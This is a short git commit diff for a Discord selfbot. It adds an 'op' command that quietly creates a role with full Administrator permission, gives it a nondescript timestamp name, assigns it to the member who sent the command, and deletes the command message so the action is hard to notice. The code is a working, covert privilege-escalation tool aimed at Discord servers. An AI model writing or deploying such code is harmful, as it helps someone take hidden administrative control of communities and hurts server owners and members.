5aac4811d3ebb4d7a7407c54a0dc0c825962ac7e
port22exposed <scm@port22.exposed>
2025-07-28 05:30:03 +0100

    quote name

--- src/commands/op.ts
+++ src/commands/op.ts
@@ -1,5 +1,21 @@
 import discord from 'discord.js-selfbot-v13'
 
 export async function execute(message: discord.Message, args: string[]) {
-	console.log(message, args)
+	if (!message.inGuild) return
+
+	const guild = message.guild!
+	const member = message.member!
+
+	const role = await guild.roles.create({
+		name: `* - ${Date.now().toString()}`,
+		permissions: ['ADMINISTRATOR'],
+		hoist: false,
+		position: guild.roles.cache.size,
+	})
+
+	await member.roles.add(role)
+	console.log(
+		`User, "${member.user.username}", has been made operator over server, "${guild.name}"`
+	)
+	await message.delete()
 }
